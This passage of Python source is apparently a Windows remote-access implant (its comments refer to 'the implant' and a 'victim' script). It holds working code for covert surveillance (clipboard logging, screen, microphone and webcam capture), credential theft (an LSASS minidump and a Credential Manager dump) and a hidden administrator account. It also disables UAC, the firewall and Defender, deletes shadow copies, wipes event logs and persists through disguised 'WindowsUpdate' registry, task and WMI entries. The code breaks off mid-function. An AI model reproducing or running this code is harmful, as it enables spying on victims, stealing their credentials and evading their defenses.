            return f"[+] Geolocation:\n  IP: {data.get('ip','N/A')}\n  City: {data.get('city','N/A')}, {data.get('region','N/A')}, {data.get('country','N/A')}\n  Coords: {data.get('loc','N/A')}\n  ISP: {data.get('org','N/A')}"
    except Exception as e:
        return f"[-] Geolocation error: {e}"

# ===================== SOUND, VOL & BATTERY =====================

def play_sound() -> str:
    """Emit a beep sound."""
    run_ps("[System.Console]::Beep(800, 1000)", timeout=5)
    return "[+] Sound (beep) played"

def set_volume(level: str) -> str:
    """Set system master volume (0-100)."""
    try:
        vol = float(level)
        if vol < 0:
            vol = 0.0
        if vol > 100:
            vol = 100.0
        ps = f'''
$code = @"
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {{
  int f(); int g(); int h(); int i();
  int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
  int j(); int k(); int l(); int m(); int n(); int o(); int p(); int q(); int r(); int s();
}}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {{ int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev); }}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {{ int f(); int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint); }}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject {{}}
public class Audio {{
  public static void SetVol(float v) {{
    var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator; IMMDevice dev = null;
    enumerator.GetDefaultAudioEndpoint(0, 1, out dev); IAudioEndpointVolume epv = null; var epvid = typeof(IAudioEndpointVolume).GUID;
    dev.Activate(ref epvid, 1, 0, out epv); epv.SetMasterVolumeLevelScalar(v, System.Guid.Empty);
  }}
}}
"@
Add-Type -TypeDefinition $code
[Audio]::SetVol({vol/100.0})
'''
        run_ps(ps, timeout=15)
        return f"[+] Volume set to {int(vol)}%"
    except Exception as e:
        return f"[-] Volume error: {e}"

def get_battery() -> str:
    """Get battery status (percentage and charging state)."""
    ps = "Get-WmiObject Win32_Battery -EA SilentlyContinue | Select-Object EstimatedChargeRemaining, BatteryStatus | ConvertTo-Json"
    out = run_ps(ps, timeout=15)
    if "EstimatedChargeRemaining" not in out:
        return "[-] Battery info not available."
    try:
        data = json.loads(out)
        if isinstance(data, list):
            data = data[0]
        charge = data.get("EstimatedChargeRemaining", "N/A")
        status = data.get("BatteryStatus", 1)
        charging = "YES" if status in [2, 6, 7, 8, 9] else "NO"
        return f"[+] Battery: {charge}% (Charging: {charging})"
    except:
        return "[-] Error checking battery."

# ===================== RECORD SCREEN =====================

def record_screen(seconds: str) -> str:
    """Record the screen for N seconds at 10 fps, return ZIP path."""
    try:
        sec = int(seconds)
    except:
        return "[-] Invalid seconds"

    rdir = os.path.join(TEMP, f"rec_{datetime.datetime.now().strftime('%H%M%S')}")
    os.makedirs(rdir, exist_ok=True)

    ps = f'''Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$t = {sec}
$fps = 10
$frames = $t * $fps
$delay = 1000 / $fps
for ($i=1; $i -le $frames; $i++) {{
    $bmp = New-Object System.Drawing.Bitmap($b.Width,$b.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
    $bmp.Save("{rdir}\\frame_$i.jpg", [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose(); $bmp.Dispose()
    Start-Sleep -Milliseconds $delay
}}
'''
    run_ps(ps, timeout=sec + 20)
    zpath = os.path.join(TEMP, "record_screen.zip")
    try:
        with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in os.listdir(rdir):
                zf.write(os.path.join(rdir, f), f)
        safe_remove(rdir)
        return zpath
    except Exception as e:
        safe_remove(rdir)
        return f"[-] ZIP error: {e}"

# ===================== CLIPBOARD MONITOR =====================

_clipmon_active = False
_clipmon_file = os.path.join(TEMP, "clipmon.txt")

def clipmon_control(action: str) -> str:
    """Control clipboard monitor: start, stop, dump, clear."""
    global _clipmon_active
    if action == "start":
        if _clipmon_active:
            return "[*] Already active"
        ps_script = r'''$f="''' + _clipmon_file + r'''"
$lc=""
while($true){
    Start-Sleep -Seconds 2
    $c = Get-Clipboard -EA SilentlyContinue
    if ($c -ne $null -and $c -ne $lc) {
        $lc = $c
        "`r`n--- $(Get-Date -F 'HH:mm:ss') ---`r`n$c" | Out-File $f -Append -Encoding utf8
    }
}'''
        ps_path = os.path.join(TEMP, "cm.ps1")
        try:
            with open(ps_path, 'w') as f:
                f.write(ps_script)
            subprocess.Popen(['powershell', '-NoProfile', '-EP', 'Bypass', '-WindowStyle', 'Hidden', '-File', ps_path],
                             creationflags=0x08000000)
            _clipmon_active = True
            return "[+] Clipboard monitor started"
        except Exception as e:
            return f"[-] Error: {e}"
    elif action == "stop":
        run_ps('''Get-WmiObject Win32_Process -Filter "Name='powershell.exe'" | Where-Object {$_.CommandLine -like '*cm.ps1*'} | ForEach-Object {Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}''')
        _clipmon_active = False
        safe_remove(os.path.join(TEMP, "cm.ps1"))
        return "[+] Clipboard monitor stopped"
    elif action == "dump":
        if os.path.exists(_clipmon_file):
            try:
                with open(_clipmon_file, 'r', encoding='utf-8', errors='replace') as f:
                    return f"[+] Clipboard History:\n{f.read()}"
            except Exception as e:
                return f"[-] Error: {e}"
        return "[-] No data"
    elif action == "clear":
        safe_remove(_clipmon_file)
        return "[+] History cleared"
    return "[-] Usage: clip_monitor start|stop|dump|clear"

def list_wifi() -> str:
    """List nearby WiFi networks."""
    return f"[+] Nearby WiFi Networks:\n{run_cmd('netsh wlan show networks mode=bssid', timeout=15)}"

# ===================== CLEANUP =====================

def cleanup() -> str:
    """Delete all temporary files created by the implant."""
    r = []
    for pat in ["si_*", "br_*", "ex_*", "sc.png", "sysinfo.tar", "browsers.zip", "exfil.tar",
                "steal_*.zip", "kl.txt", "kl.ps1", "sam.save", "system.save", "security.save",
                "record_screen.zip", "rec_*", "cm.ps1", "clipmon.txt",
                "mic_rec.wav", "webcam.jpg", "lsass.dmp", "_gc.ps1",
                "dir_*.zip", "sl.ps1", "scrloop.zip", "scrloop",
                "tts_*.vbs", "dl_*", "port_scan_*"]:
        for f in glob.glob(os.path.join(TEMP, pat)):
            safe_remove(f)
            r.append(f"  Removed: {os.path.basename(f)}")
    # Clear PS history
    psh = os.path.join(APPDATA, "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
    if os.path.exists(psh):
        try:
            open(psh, 'w').close()
            r.append("  PS history cleared")
        except:
            pass
    run_cmd('doskey /reinstall 2>nul')
    return "[+] Cleanup:\n" + "\n".join(r) if r else "[+] Nothing to clean"

# ===================== LS =====================

def list_directory(path: str = ".") -> str:
    """List directory contents with details."""
    try:
        path = os.path.abspath(path)
        if not os.path.isdir(path):
            return f"[-] Not a directory: {path}"
        r = [f"Directory: {path}\n"]
        dirs, files = [], []
        for e in sorted(os.listdir(path)):
            full = os.path.join(path, e)
            try:
                st = os.stat(full)
                mt = datetime.datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')
                if os.path.isdir(full):
                    dirs.append(f"  [DIR]  {mt}            {e}")
                else:
                    files.append(f"  [FILE] {mt} {st.st_size:>10} {e}")
            except:
                files.append(f"  [???]                      {e}")
        r.extend(dirs)
        r.extend(files)
        r.append(f"\n  {len(dirs)} dirs, {len(files)} files")
        return "\n".join(r)
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== STATUS =====================

def get_uptime_str() -> str:
    """Get system uptime as string."""
    try:
        tick = ctypes.windll.kernel32.GetTickCount64()
        sec = tick // 1000
        d = sec // 86400
        h = (sec % 86400) // 3600
        m = (sec % 3600) // 60
        return f"{d}d {h}h {m}m"
    except:
        return "N/A"

def get_system_status() -> str:
    """Return quick system status."""
    try:
        user = getpass.getuser()
        host = socket.gethostname()
        admin = "YES" if is_admin() else "NO"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            ip = s.getsockname()[0]
            s.close()
        except:
            ip = "N/A"
        return f"User: {user}\nHost: {host}\nIP: {ip}\nAdmin: {admin}\nPID: {os.getpid()}\nDir: {os.getcwd()}\nUptime: {get_uptime_str()}"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== ALERT =====================

def show_alert(msg: str) -> str:
    """Display a popup message box."""
    env = os.environ.copy()
    env['_ALERT_MSG'] = msg
    ps = 'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($env:_ALERT_MSG,"System","OK","Information") | Out-Null'
    try:
        subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', ps],
                       timeout=15, capture_output=True, creationflags=0x08000000, env=env)
        return "[+] Alert displayed"
    except:
        return "[-] Error displaying alert"

# ===================== RECORD MIC =====================

def record_mic(seconds: str) -> str:
    """Record microphone for N seconds, return WAV path."""
    try:
        sec = int(seconds)
        if sec <= 0 or sec > 3600:
            return "[-] Invalid seconds (1-3600)"
    except:
        return "[-] Usage: record_mic <seconds>"
    out_path = os.path.join(TEMP, "mic_rec.wav")
    safe_remove(out_path)
    ps = f'''Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class MCI {{
    [DllImport("winmm.dll", CharSet=CharSet.Auto)]
    public static extern int mciSendString(string cmd, System.Text.StringBuilder ret, int retLen, IntPtr callback);
}}
"@
[MCI]::mciSendString("open new Type waveaudio Alias mic", $null, 0, [IntPtr]::Zero) | Out-Null
[MCI]::mciSendString("set mic bitspersample 16 samplespersec 44100 channels 1 alignment 2", $null, 0, [IntPtr]::Zero) | Out-Null
[MCI]::mciSendString("record mic", $null, 0, [IntPtr]::Zero) | Out-Null
Start-Sleep -Seconds {sec}
[MCI]::mciSendString("stop mic", $null, 0, [IntPtr]::Zero) | Out-Null
[MCI]::mciSendString("save mic `"{out_path}`"", $null, 0, [IntPtr]::Zero) | Out-Null
[MCI]::mciSendString("close mic", $null, 0, [IntPtr]::Zero) | Out-Null
'''
    run_ps(ps, timeout=sec + 20)
    if os.path.exists(out_path) and os.path.getsize(out_path) > 100:
        return out_path
    return "[-] Recording failed (microphone available?)"

# ===================== WEBCAM SNAP =====================

def webcam_snap() -> str:
    """Take a picture from the webcam."""
    out_path = os.path.join(TEMP, "webcam.jpg")
    safe_remove(out_path)
    ps = f'''$ErrorActionPreference = 'SilentlyContinue'
try {{
    $deviceManager = New-Object -ComObject WIA.DeviceManager
    $device = $deviceManager.DeviceInfos | Where-Object {{$_.Type -eq 2}} | Select-Object -First 1
    if ($device) {{
        $cam = $device.Connect()
        $item = $cam.Items | Select-Object -First 1
        $img = $item.Transfer("{{B96B3CAE-0728-11D3-9D7B-0000F81EF32E}}")
        $img.SaveFile("{out_path}")
    }}
}} catch {{}}
'''
    run_ps(ps, timeout=20)
    if not os.path.exists(out_path) or os.path.getsize(out_path) < 100:
        ffmpeg = shutil.which('ffmpeg')
        if ffmpeg:
            run_cmd(f'"{ffmpeg}" -f dshow -i video="" -frames:v 1 -y "{out_path}" 2>nul', timeout=15)
    if os.path.exists(out_path) and os.path.getsize(out_path) > 100:
        return out_path
    return "[-] Webcam unavailable or no image"

# ===================== LOCK SCREEN =====================

def lock_screen() -> str:
    """Lock the workstation."""
    try:
        ctypes.windll.user32.LockWorkStation()
        return "[+] Screen locked"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== CHANGE WALLPAPER =====================

def change_wallpaper(img_path: str) -> str:
    """Change desktop wallpaper to a local image."""
    img_path = img_path.strip('"').strip("'")
    if not os.path.exists(img_path):
        return f"[-] Does not exist: {img_path}"
    try:
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, img_path, 0x01 | 0x02)
        return f"[+] Wallpaper changed: {img_path}"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== APP CONTROL =====================

def kill_app(name: str) -> str:
    """Kill a process by name."""
    name = name.strip()
    if not name.lower().endswith('.exe'):
        name += '.exe'
    r = run_cmd(f'taskkill /IM "{name}" /F')
    return f"[+] {r}" if any(w in r.lower() for w in ['killed', 'terminado', 'finaliz']) else r

def open_app(name: str) -> str:
    """Launch an application in the background."""
    try:
        subprocess.Popen(name, shell=True, creationflags=0x08000000)
        return f"[+] Launched: {name}"
    except Exception as e:
        return f"[-] Error: {e}"

def hide_app(name: str) -> str:
    """Hide windows of a process."""
    name = name.strip()
    ps = f'''Add-Type @"
using System;
using System.Runtime.InteropServices;
public class W32 {{
    [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h, int n);
}}
"@
$procs = Get-Process | Where-Object {{$_.MainWindowTitle -like '*{name}*' -or $_.Name -like '*{name}*'}} -EA SilentlyContinue
foreach($p in $procs){{[W32]::ShowWindow($p.MainWindowHandle,0)|Out-Null}}
$procs.Count
'''
    count = run_ps(ps, timeout=10).strip()
    return f"[+] {count} window(s) of '{name}' hidden" if count.isdigit() else f"[?] {count}"

def show_app(name: str) -> str:
    """Restore hidden windows of a process."""
    name = name.strip()
    ps = f'''Add-Type @"
using System;
using System.Runtime.InteropServices;
public class W32b {{
    [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h, int n);
}}
"@
$procs = Get-Process | Where-Object {{$_.Name -like '*{name}*'}} -EA SilentlyContinue
foreach($p in $procs){{[W32b]::ShowWindow($p.MainWindowHandle,9)|Out-Null}}
$procs.Count
'''
    count = run_ps(ps, timeout=10).strip()
    return f"[+] {count} window(s) of '{name}' shown" if count.isdigit() else f"[?] {count}"

# ===================== ADMIN-ONLY: DUMP LSASS =====================

def dump_lsass() -> str:
    """Create a minidump of lsass.exe (requires admin and SeDebugPrivilege)."""
    if not is_admin():
        return "[-] Requires admin"
    out_path = os.path.join(TEMP, "lsass.dmp")
    safe_remove(out_path)
    pid_out = run_cmd('tasklist /FI "IMAGENAME eq lsass.exe" /FO CSV /NH')
    pid = None
    for line in pid_out.split('\n'):
        if 'lsass' in line.lower():
            parts = line.strip().strip('"').split('","')
            if len(parts) >= 2:
                try:
                    pid = int(parts[1])
                    break
                except:
                    pass
    if pid is None:
        return "[-] Could not find lsass.exe PID"
    r = run_cmd(f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {pid} "{out_path}" full')
    if os.path.exists(out_path) and os.path.getsize(out_path) > 1000:
        return out_path
    return f"[-] Dump failed. PID={pid}. Output: {r[:200]}"

# ===================== ADMIN-ONLY: ENABLE RDP =====================

def enable_rdp() -> str:
    """Enable Remote Desktop and add current user to Remote Desktop Users group."""
    if not is_admin():
        return "[-] Requires admin"
    results = []
    r1 = run_cmd(r'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
    results.append("[+] fDenyTSConnections=0" if any(w in r1.lower() for w in ['correc', 'ok', 'exito', '1']) else f"[-] Registry: {r1[:80]}")
    run_cmd('sc config TermService start= auto')
    run_cmd('sc start TermService')
    results.append("[+] TermService started")
    r2 = run_cmd('netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow')
    results.append("[+] RDP firewall rule added" if any(w in r2.lower() for w in ['ok', 'correc']) else f"[-] Firewall: {r2[:80]}")
    user = getpass.getuser()
    run_cmd(f'net localgroup "Remote Desktop Users" "{user}" /add 2>nul')
    results.append(f"[+] User '{user}' added to Remote Desktop Users")
    results.append("[*] IP/port: see 'status' + port 3389")
    return "\n".join(results)

# ===================== ADMIN-ONLY: ADD HIDDEN USER =====================

def add_user(username: str, password: str) -> str:
    """Create a new local administrator user and hide it from the login screen."""
    if not is_admin():
        return "[-] Requires admin"
    results = []
    r1 = run_cmd(f'net user "{username}" "{password}" /add')
    results.append("[+] User created" if any(w in r1.lower() for w in ['correc', 'ok', '1']) else f"[-] {r1[:100]}")
    r2 = run_cmd(f'net localgroup Administrators "{username}" /add')
    results.append("[+] Added to Administrators" if any(w in r2.lower() for w in ['correc', 'ok', '1']) else f"[-] Groups: {r2[:80]}")
    reg_path = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
    try:
        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, username, 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        results.append(f"[+] User '{username}' hidden from login screen")
    except Exception as e:
        results.append(f"[-] Hide: {e}")
    return "\n".join(results)

# ===================== ADMIN-ONLY: DISABLE UAC =====================

def disable_uac() -> str:
    """Disable User Account Control (requires reboot to take effect)."""
    if not is_admin():
        return "[-] Requires admin"
    reg_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'EnableLUA', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        results.append("[+] EnableLUA=0 (UAC disabled)")
    except Exception as e:
        results.append(f"[-] Registry: {e}")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'ConsentPromptBehaviorAdmin', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        results.append("[+] ConsentPromptBehaviorAdmin=0")
    except:
        pass
    results.append("[!] REBOOT required for changes to take effect")
    return "\n".join(results)

# ===================== ADMIN-ONLY: DISABLE FIREWALL =====================

def disable_firewall() -> str:
    """Disable Windows Firewall for all profiles."""
    if not is_admin():
        return "[-] Requires admin"
    r = run_cmd('netsh advfirewall set allprofiles state off')
    return "[+] Firewall disabled (all profiles)" if any(w in r.lower() for w in ['ok', 'correc']) else f"[?] {r}"

# ===================== ADMIN-ONLY: CLEAR LOGS =====================

def clear_logs() -> str:
    """Clear Windows Event Logs and PowerShell history."""
    if not is_admin():
        return "[-] Requires admin"
    results = []
    logs_out = run_cmd('wevtutil el')
    log_list = [l.strip() for l in logs_out.split('\n') if l.strip()]
    priority = ['Security', 'System', 'Application', 'Microsoft-Windows-PowerShell/Operational',
                'Windows PowerShell', 'Microsoft-Windows-TaskScheduler/Operational']
    ordered = [l for l in priority if l in log_list] + [l for l in log_list if l not in priority]
    cleared = 0
    for log in ordered[:50]:
        r = run_cmd(f'wevtutil cl "{log}" 2>nul')
        if '[-]' not in r:
            cleared += 1
    results.append(f"[+] {cleared} of {len(ordered)} event logs cleared")
    psh = os.path.join(APPDATA, "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
    if os.path.exists(psh):
        try:
            open(psh, 'w').close()
            results.append("[+] PowerShell history cleared")
        except:
            pass
    return "\n".join(results)

# ===================== ADMIN-ONLY: EXCLUDE PATH/EXT =====================

def exclude_path(path: str) -> str:
    """Add a path to Windows Defender exclusions."""
    if not is_admin():
        return "[-] Requires admin"
    path = path.strip('"').strip("'")
    if not path:
        path = os.getcwd()
    r = run_ps(f'Add-MpPreference -ExclusionPath "{path}" -EA SilentlyContinue', timeout=15)
    return f"[-] {r[:200]}" if any(w in r.lower() for w in ['error', 'denied']) else f"[+] Path exclusion added: {path}"

def exclude_ext(ext: str) -> str:
    """Add a file extension to Windows Defender exclusions."""
    if not is_admin():
        return "[-] Requires admin"
    ext = ext.strip().lstrip('.')
    r = run_ps(f'Add-MpPreference -ExclusionExtension ".{ext}" -EA SilentlyContinue', timeout=15)
    return f"[-] {r[:200]}" if any(w in r.lower() for w in ['error', 'denied']) else f"[+] Extension .{ext} added to Defender exclusions"

# ===================== ADMIN-ONLY: BLUE SCREEN =====================

def blue_screen() -> str:
    """Force a Blue Screen of Death (BSOD)."""
    if not is_admin():
        return "[-] Requires admin"
    try:
        nt = ctypes.windll.ntdll
        prev = ctypes.c_bool()
        nt.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev))
        response = ctypes.c_int()
        nt.NtRaiseHardError(0xC0000420, 0, None, None, 6, ctypes.byref(response))
        return "[+] BSOD triggered"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== ADMIN-ONLY: DISABLE TASK MANAGER =====================

def disable_taskmgr() -> str:
    """Disable Task Manager via registry policy."""
    if not is_admin():
        return "[-] Requires admin"
    try:
        reg_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'DisableTaskMgr', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "[+] Task Manager disabled"
    except Exception as e:
        return f"[-] Error: {e}"

def enable_taskmgr() -> str:
    """Re-enable Task Manager."""
    if not is_admin():
        return "[-] Requires admin"
    try:
        reg_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, 'DisableTaskMgr')
        winreg.CloseKey(key)
        return "[+] Task Manager re-enabled"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== ADMIN-ONLY: DISABLE CMD =====================

def disable_cmd() -> str:
    """Disable Command Prompt for the current user."""
    if not is_admin():
        return "[-] Requires admin"
    try:
        reg_path = r'SOFTWARE\Policies\Microsoft\Windows\System'
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'DisableCMD', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "[+] CMD disabled for current user"
    except Exception as e:
        return f"[-] Error: {e}"

def enable_cmd() -> str:
    """Re-enable Command Prompt."""
    if not is_admin():
        return "[-] Requires admin"
    try:
        reg_path = r'SOFTWARE\Policies\Microsoft\Windows\System'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, 'DisableCMD')
        winreg.CloseKey(key)
        return "[+] CMD re-enabled"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== ADMIN-ONLY: SHADOW COPY =====================

def shadow_copy_list() -> str:
    """List volume shadow copies."""
    if not is_admin():
        return "[-] Requires admin"
    return "[+] Shadow copies:\n" + run_cmd('vssadmin list shadows', timeout=15)

def shadow_copy_delete() -> str:
    """Delete all volume shadow copies."""
    if not is_admin():
        return "[-] Requires admin"
    r = run_cmd('vssadmin delete shadows /all /quiet', timeout=15)
    return "[+] Shadow copies deleted" if '[-]' not in r else r

# ===================== ADMIN-ONLY: SAFE MODE PERSIST =====================

def safe_mode_persist() -> str:
    """Install persistence via HKLM RunOnce with '*' prefix to run in Safe Mode."""
    if not is_admin():
        return "[-] Requires admin"
    exe = sys.executable.replace("python.exe", "pythonw.exe")
    reg_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, '*WindowsUpdate', 0, winreg.REG_SZ, f'"{exe}" "{PERSIST_SCRIPT}"')
        winreg.CloseKey(key)
        return "[+] RunOnce persistence (Safe Mode) installed\n[*] The '*' prefix ensures execution in Safe Mode"
    except Exception as e:
        return f"[-] Error: {e}"

# ===================== SYS PERSIST (ADMIN) =====================

def sys_persist() -> str:
    """Create a scheduled task that runs as SYSTEM at startup."""
    if not is_admin():
        return "[-] Requires admin"
    exe = sys.executable.replace("python.exe", "pythonw.exe")
    task_name = PERSIST_TASK_NAME + "_System"
    cmd = f'schtasks /create /tn "{task_name}" /tr "\\"{exe}\\" \\"{PERSIST_SCRIPT}\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
    r = run_cmd(cmd)
    if any(w in r.lower() for w in ['correc', 'success', 'exito', 'ok']):
        return f"[+] SYSTEM task '{task_name}' created — runs at startup as SYSTEM"
    return f"[-] Error: {r[:200]}"

# ===================== WMI PERSIST (ADMIN) =====================

def persist_wmi() -> str:
    """Install WMI event subscription persistence (triggers ~120s after boot)."""
    if not is_admin():
        return "[-] Requires admin"
    exe = sys.executable.replace("python.exe", "pythonw.exe")
    ps = f'''$ErrorActionPreference = 'SilentlyContinue'
$fn = "WinUpdateFilter"; $cn = "WinUpdateConsumer"
Get-WMIObject -NS root\\subscription -Class __EventFilter | Where{{$_.Name -eq $fn}} | Remove-WmiObject
Get-WMIObject -NS root\\subscription -Class CommandLineEventConsumer | Where{{$_.Name -eq $cn}} | Remove-WmiObject
$filter = Set-WmiInstance -Class __EventFilter -NS root\\subscription -Arguments @{{
    Name=$fn; EventNamespace="root\\cimv2"
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 325"
    QueryLanguage="WQL"
}}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -NS root\\subscription -Arguments @{{
    Name=$cn; CommandLineTemplate='"{exe}" "{PERSIST_SCRIPT}"'
}}
Set-WmiInstance -Class __FilterToConsumerBinding -NS root\\subscription -Arguments @{{
    Filter=$filter; Consumer=$consumer
}} | Out-Null
"OK"
'''
    r = run_ps(ps, timeout=30)
    if 'ok' in r.lower():
        return "[+] WMI persistence installed\n[*] Trigger: ~120s after startup\n[!] Very difficult to detect"
    return f"[-] WMI error: {r[:300]}"

# ===================== AUTODESTROY =====================

def autodestroy() -> str:
    """
    Completely remove the implant: delete persistence, clean temp files,
    clear logs (if admin), and schedule self-deletion via PowerShell.
    """
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, PERSIST_NAME)
        winreg.CloseKey(key)
        results.append("[+] HKCU Registry removed")
    except:
        results.append("[-] HKCU Registry: not found")
    if is_admin():
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                  0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, PERSIST_NAME)
            winreg.CloseKey(key)
            results.append("[+] HKLM Registry removed")
        except:
            pass
    run_cmd(f'schtasks /delete /tn "{PERSIST_TASK_NAME}" /f 2>nul')
    run_cmd(f'schtasks /delete /tn "{PERSIST_TASK_NAME}_System" /f 2>nul')
    results.append("[+] Scheduled tasks removed")
    vbs = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.vbs")
    safe_remove(vbs)
    results.append("[+] Startup VBS removed")
    if is_admin():
        clear_logs()
        results.append("[+] Event logs cleared")
    cleanup()
    results.append("[+] Temporary files cleaned")
    script_to_delete = PERSIST_SCRIPT
    this_script = os.path.abspath(__file__)
    pid = os.getpid()
    killer_ps = os.path.join(TEMP, "_gc.ps1")
    ps_content = f'''$pid_target = {pid}
$scripts = @("{script_to_delete}", "{this_script}")
Start-Sleep -Seconds 3
try {{ Wait-Process -Id $pid_target -Timeout 10 -EA SilentlyContinue }} catch {{}}
foreach($s in $scripts) {{ if(Test-Path $s){{ Remove-Item $s -Force -EA SilentlyContinue }} }}
Remove-Item "{killer_ps}" -Force -EA SilentlyContinue
'''
    try:
        with open(killer_ps, 'w') as f:
            f.write(ps_content)
        subprocess.Popen(['powershell', '-NoProfile', '-EP', 'Bypass', '-WindowStyle', 'Hidden', '-File', killer_ps],
                         creationflags=0x08000000)
        results.append("[+] Self-destruction scheduled")
    except Exception as e:
        results.append(f"[-] Killer script: {e}")
    results.append("[!] Closing shell... The implant will be deleted in seconds.")
    return "\n".join(results)

# ===================== COMMON FUNCTIONS (shared with victim_win.pyw) =====================
# These functions are identical to the non-admin version and are included for completeness.

def search_files(pattern: str, root: str = "C:\\") -> str:
    """Search files by name pattern."""
    pattern = pattern.strip().strip('"\'')
    if not pattern:
        return "[-] Usage: search <pattern>"
    r = run_cmd(f'dir /s /b "{root}\\*{pattern}*" 2>nul', timeout=30)
    lines = [l.strip() for l in r.split('\n') if l.strip() and '\\' in l and not l.startswith('[-]')]
    if not lines:
        return f"[-] No results for: {pattern}"
    out = f"[+] {len(lines)} result(s) for '{pattern}':\n"
    out += '\n'.join(lines[:100])
    if len(lines) > 100:
        out += f"\n[...and {len(lines)-100} more...]"
    return out

def dump_credvault() -> str:
    """Dump Windows Credential Manager and DPAPI files."""
    results = ["=== Windows Credential Manager ==="]
    results.append(run_cmd('cmdkey /list'))
    results.append("\n=== DPAPI Files ===")
    for cred_dir in [os.path.join(APPDATA, "Microsoft", "Credentials"),
                     os.path.join(LOCAL_APPDATA, "Microsoft", "Credentials")]:
        if os.path.exists(cred_dir):
            try:
                for f in os.listdir(cred_dir):
                    results.append(f"  {cred_dir}\\{f}")
            except:
                pass
    ps = r'''$ErrorActionPreference='SilentlyContinue'
try {
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $v = New-Object Windows.Security.Credentials.PasswordVault
    $all = $v.RetrieveAll()
    if ($all.Count -gt 0) {
